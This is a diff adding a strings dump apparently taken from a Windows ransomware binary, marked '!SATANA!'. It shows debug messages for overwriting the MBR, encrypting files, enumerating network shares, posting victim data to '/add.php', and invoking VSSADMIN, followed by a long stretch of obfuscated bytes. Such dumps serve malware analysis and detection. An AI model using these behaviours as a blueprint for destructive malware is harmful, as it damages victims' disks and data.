@@ -1,0 +1,493 @@
+!This program cannot be run in DOS mode.
+`.data
+.reloc
+/add.php
+%s: #0x%X %s
+DeCompressor
+%s: Error API
+Try Decrypt: uc_size = %d, c_size = %d
+%s: Error DecB: 0x%X
+%s: Ok: %d
+0123456789ABCDEF
+advapi32
+MD5Init
+MD5Update
+MD5Final
+%s: Error load lib 0x%X
+rundll32.exe
+Size: 0x%X key:0x%X
+HeapAlloc sz = %d
+Extractor
+%s: Error Heap
+MBRsz = %d
+Try Extract Font
+dwSzFont = %d
+dwSzLending = %d
+dwSzBTC = %d
+dwSzMail = %d
+dwMailSelector = %d  dwBtcSelector = %d
+Save Leading to %s done
+Engine: Try to open drive %s
+Engine: %s opened
+%s: No MBR sector
+Total sectors:%d
+SectorSize: %d
+ZeroSecNum:%d
+FirstZero:%d
+LastZero:%d
+Font (%d [byte]) written to Disk: %d
+XOR key=0x%X
+Message len: %d
+Message written to Disk
+Try write MBR to Disk: %d
+Random sector written
+DAY: %d
+MBR written to Disk# %d
+Error write MBR to Disk
+No NEW MBR!
+Free %d sectors not found
+Try HeapFree #1
+Engine: Error SecNum<63!
+Engine: Error Read First Sector!
+Try HeapFree #2
+Engine: Error BytesPerSector!
+Engine: Error DeviceIoControl!
+Try HeapFree #3
+POST %s HTTP/1.0
+Host: %s
+Content-type: application/x-www-form-urlencoded
+Content-length: %d
+DnsFlushResolverCache
+dnsapi.dll
+error socket
+error gethostbyname
+error DnsFlushResolverCache
+Error: DNS not resolved!
+gethostbyname - OK
+Error connect
+Connected
+error WSAStartup
+ERROR CREATE HEAP!!!
+IsWow64Process
+kernel32
+hHeap = 0x%X nSize = %d
+Locale: %s
+id=%d&code=%d&sdata=%d.%d.%d %d %d %s %s %d&name=%s&md5=%s&dlen=%s
+Error Get File Size: 0x%X
+Encoder
+%s: EXCEPT!!
+FindFirstFile->
+<-FindFirstFile
+EnumLocalRes
+%s--->
+Find All
+WNetOpenEnumW
+=======EEEEEEEEEEEEEE=========
+EnumNetRes
+%s: Error HeapAlloc
+!SATANA!
+!Except: 0x%X
+%s%s%s%s
+PHWID: %s
+E-mail
+E-mail found: %s
+%X%X%X%X%X%X%X%X
+wcWinDir: %s dwWinDirLen = %d
+###########################################First Phase Done
+###########################################Two Phase Done counter = %d
+###########################################Three Phase Done counter = %d, Start WatchDog
+###########################################All Phase Done
+HWID: %s
+2 -th start
+%I64d:%d
+Time: %d
+VOLUME:File: %s
+THE END.
+Error set privilege
+1 -th start
+Error in tAF
+QWRVPj
+QRWPhL
+D$Dj.P
+L$DQRh
+j0hp?A
+VC20XC00U
+t ;t$$t
+_stricmp
+sprintf
+mbstowcs
+vsprintf
+NtYieldExecution
+RtlGetCurrentPeb
+NtQueryInformationProcess
+wcsrchr
+wcsstr
+_vsnwprintf
+RtlGetNtVersionNumbers
+strrchr
+wcsncmp
+wcstombs
+ntdll.dll
+malloc
+??3@YAXPAX@Z
+??2@YAPAXI@Z
+MSVCRT.dll
+GetFullPathNameW
+ExitProcess
+GetCommandLineW
+GetComputerNameA
+CreateFileA
+GetFileSize
+SetPriorityClass
+FindFirstFileW
+SetFilePointer
+GetLocaleInfoA
+MapViewOfFile
+UnmapViewOfFile
+GetDriveTypeW
+FreeLibrary
+HeapAlloc
+SetUnhandledExceptionFilter
+InterlockedIncrement
+MoveFileExW
+InterlockedDecrement
+GetCurrentProcess
+GetLogicalDriveStringsW
+HeapFree
+WaitForSingleObject
+GetSystemDefaultLCID
+OutputDebugStringW
+GetTickCount
+GetProcessHeap
+FormatMessageA
+WriteFile
+InitializeCriticalSection
+GetSystemDirectoryW
+CopyFileW
+LeaveCriticalSection
+HeapCreate
+CreateProcessA
+ReadFile
+CreateFileW
+SetThreadPriority
+FlushFileBuffers
+GetTempPathW
+GetFileSizeEx
+GetLastError
+GetProcAddress
+QueueUserAPC
+MoveFileW
+EnterCriticalSection
+VirtualAllocEx
+FindClose
+GetLocalTime
+LoadLibraryA
+CreateFileMappingA
+LocalAlloc
+DeviceIoControl
+WaitForMultipleObjects
+GetModuleFileNameA
+GetModuleHandleA
+FindNextFileW
+GetShortPathNameW
+OutputDebugStringA
+CloseHandle
+GetWindowsDirectoryW
+DeleteFileW
+LocalFree
+WriteProcessMemory
+ResumeThread
+SetFileAttributesW
+DeleteFileA
+CreateThread
+ExpandEnvironmentStringsW
+SwitchToThread
+KERNEL32.dll
+WNetCloseEnum
+WNetOpenEnumW
+WNetEnumResourceW
+MPR.dll
+WS2_32.dll
+MessageBoxA
+wsprintfW
+USER32.dll
+RegSetValueExA
+RegQueryValueExA
+RegCreateKeyExA
+RegOpenKeyExA
+GetUserNameA
+GetCurrentHwProfileW
+RegCloseKey
+RegSetValueExW
+ADVAPI32.dll
+CommandLineToArgvW
+SHELL32.dll
+_chkstk
+memset
+memcpy
+_allrem
+RtlUnwind
+tgwyugwq
+JuXwjxHlvsy
+]^1`UN`[RMLXQ`XfV7w
+swqhqr::7o
+-Uwewz
+Sexy~w{nE,
+tjhpq99
+TjhpqK
+SvoHjivuy|p
+bfyeuo::
+vuhv88
+Swvwngu
+544.=44
+244F044
+744y644
+5444 444$44S244#244(644
+4V=4244
+54-R76-4
+DF[SFUY4
+WUZZ[@
+!63 03&63f]W2\5
+574haZc1'
+164414
+7U4f6|
+! t7$d
+$!Z8U;\+t60
+)@6=20
+>TYT6\
++4+4+4+4+4+4+4+4
++4+4+4+444N
+7D414g4[4R44@4C4U4F4
+Q4h4u4_
+4@$4Qd654c6
+A4Z4PF6a
+@d5hN5
+$5!54W
+"64-5qL]4@dF[WQGG44
+4wFQU@2Q
+4rF6Q4?
+7{A@D4A@pQVASg
+6D:%5g@4UF@AD}ZR4[c4f4wX[4GQ|UZPXQ 4)
+]F[ZYQZ
+qfzqx4
+PXX444Z6fQSeAQ4FMbUXAQq>L
+2454upbudZ}
+94:4>;
+'4 44!4"4#4,44-4.4/4(4
+4<auw0
+z@d[CQF
+4FYU@][Z44w[ZG@FAW0@d
+]UXyG<SbcP
+aF]4$wAFFt
+pQB{V^
+4<]WQE0x]G@
+5$qZAY
+5@QF(RU
+S04p8XXD
+0QFgQ4FBQF4sQZPQFD<uWu8d
+A4Q4zQ@uD]
+vARRQF6
+%K6g0]N65fQY[@
+Qw[YDvd5AD
+5UDp]D
+6z|UYQT
+[YU]Zi5sFL[ADy5g3
+\UFz5aZW
+-wUZD[Z]Wt5
+FU$"G 5U7K6f5+
+gW\QYt5F]fB$1w[v
+[DYV]Z
+g6x40c]ZP[C
+/4vXUW_V[U0FP
+5P}@QY5e
+4PGwFQU@Q4vXUW_V[U4FP4cPGpQ
+G@F[M?
+AYr]FG@3l$}@QY1
+rFQQpU@&U5"sQ<tbUX0AQ5
+}Z]@]$UX]N79Gp]4USZ[G@]W4y[PQqZUV0XQ6KgQ@uG4GQF@rXUS6G0%ADx[Sy
+QGGUSQc5't`QFY]Z4
+2*J4L3*!7p,7&
+34T546 
+RvvR77
+0+*2:.L
+7;KWKW44S<
+3642:*
+262k,,,J1l*45
+8O/5463H
+3541{64
+>64,80
+0<84}w2<q6(62
+/RV\TL\TVR
+E9]44<L8H
+kXhPTV
+r\J28q^
+5U7U0,D
+84;}84%p/4a
+h^ZE64
+t22**22
+551V@W9>
+u=4L7C49>
+9>w{pq
+K]@W[]Z9
+2vw05s
+`4\QFQ
+WFMD@]Z4S
+R]4XQG
+V[[@4_]@
+B]FA$G9>
+DF]BU@Q
+W[PQ5"
+v]@W[4
+@[@U6X50V@W9>u$R@QF
+<PAF5J
+PUM4!\Q
+G[R@CU
+V4<QZ@4
+-ZQWQGG<UFM
+G@FA4W@][ZG
+$\UFP6
+R]SAFU
+u0ZW[YDA
+UVG[>X
+YD[G4G]VXQ
+9fQW[B
+{C\]W\
+DF[SFUY9r5
+0?}G]SZ<U@A4vRF[Y54
+DAVX]W
+4WQF@]R]W%
+/R]tWt
+@4QL@9>P[W8AY
+50'ZUYtyv
+DDFQW]
+4MG@QY
+RAXt[Ov
+tDUtcGQQ
+@[A0t~m
+Ap75HV
+-AZX<[W_V&
+qz`q(f
+$tU4c]ZA
+5\QXD+
+4lW_fsFR_4]
+\QAG_A4rUBB\
+C4Yf]UuAWF4dZ9>l@AY4Dmenq
+4Ar`[WuVat
+pwPCe4rS4W~D@Pm
+D4gb@wswuB4rvUB|
+]ugBg54rVB
+4b[CDvxCq4
+Wz0rC4
+r4yAm_gb\g4C^v
+CBS|4zZ`p\`UG$xE@L4
+cu_sncW4SQL
+qV5sS4cY
+RW4FP`dpCq
+pQRp`L]4
+yE4fdQU
+s4~qBumQb_4DBr
+\_4e~vAV
+`~uzl4@elswUWz0as
+_qLD4vq
+NlbPVR$AL
+%QD`4WRrNM
+4xDMffeME4vN
+^GNCftbV[
+4Nc_GDnuY4wcSWr
+QD4yU\\nc`f5
+%G|YAA]c4WyS^]@Es4ULPUURZv4swZd
+MG4scZ~
+CBQ4nfdfg
+YL|f4[
+4rPzAYxau4fEGcBq`|4sws
+4YU@AG]_
+t@QW\QY4U]X
+W[Y94>gQG]XX]6X9hy[Z]_UT
+7xU,PUY52<
+sF]tWU_[BU:J]tGGSUZN<bgtUFU\ks<%_4\[DQF]U
+[F^4d0^U<&FMUZE>C4
+S3'VUZQ
+@ZU@]=
+YQ4SFQXU
+_]FF=+4XUZUW\_U<
+\UD4F[Bk]S[F5<?
+2:8268>6;@9=ED
+TQIX\GYMeWto
+Lw}qnthLjxtqyo@IGHS
+HgwWmkst`syp|
+TgwJtxlo{y
+zqex~u
+Egoiyk'[qko{
+>6>;>^>d>
+?#?:?A?Q?t?~?
+0*0j0s0|0
+1N1\1j1x1
+1!2/2=2K2
+33-3;3I3]3k3y3
+4+4?4M4[4i4}4
+5(5S5c5{5
+60676?6
+7 7%7A7K7i7q7
+8#8(8?8E8J8S8`8
+:]:c:p:
+<J<Q<9=>=D=k=
+=(>5>G>N>[>b>x>
+?3?9?@?F?M?S?Z?`?g?m?t?z?
+0*080E0J0S0X0p0u0
+1!1+161;1I1V1b1m1r1
+2?2P2}2
+3"3(3.3J3S3Z3g3
+474@4b4g4p4z4
+5c6q6}6
+7(7<7S7c7l7z7
+8$8+8\8f8z8
+879B9W9o9z9
+::,:;:B:O:Z:i:v:}:
+;-;2;A;K;W;\;b;i;n;
+<&<<<L<
+=#=*=:=O=`=f=
+>n>u>}>
+?"?K?j?
+0B1f1p1y1
+2>2J2W2k2u2}2
+4%4/4J4X4b4
+4+5R5l5v5~5
+6$60676=6D6M6d6k6p6~6
+7+7D7I7T7d7n7
+8&8,828N8v8{8
+909G9a9
+:(:/:<:C:c:j:p:z:
+;1;J;Q;
+< <&<+<0<A<I<`<k<q<{<
+=+=6=>=C=`=k=q=z=
+>#>K>x>
+?$?1?:?G?a?l?s?z?
+0+0E0S0
+1A1J1e1k1u1{1
+2 2%2*2D2V2m2r2
+303G3Z3m3v3
+4U4^4f4
+5(505:5?5J5e5l5r5w5
+61666B6S6Z6g6
+7+7<7I7Y7j7
+868k8s8
+:(:-:8:?:R:\:e:m:
+;!;:;P;V;\;4<D<
+d!satana!.txt
+<<<<<<<<#%d End Encode %s
+Error CreateFileMapping: 0x%X, size: %d, %s
+%s%s___%s
+!satana!
+Microsoft\Windows
+\!satana!.txt
+----%s
+EnumNetRes
+%s: NET RES FOUND: %s
+%PROCESSOR_ARCHITECTURE%
+%PROCESSOR_IDENTIFIER%
+%PROCESSOR_LEVEL%
+%PROCESSOR_REVISION%
+%s\VSSADMIN.EXE
+Copied to %s
+ %s "%s"
+threadAdminFlood: %s %s %s 
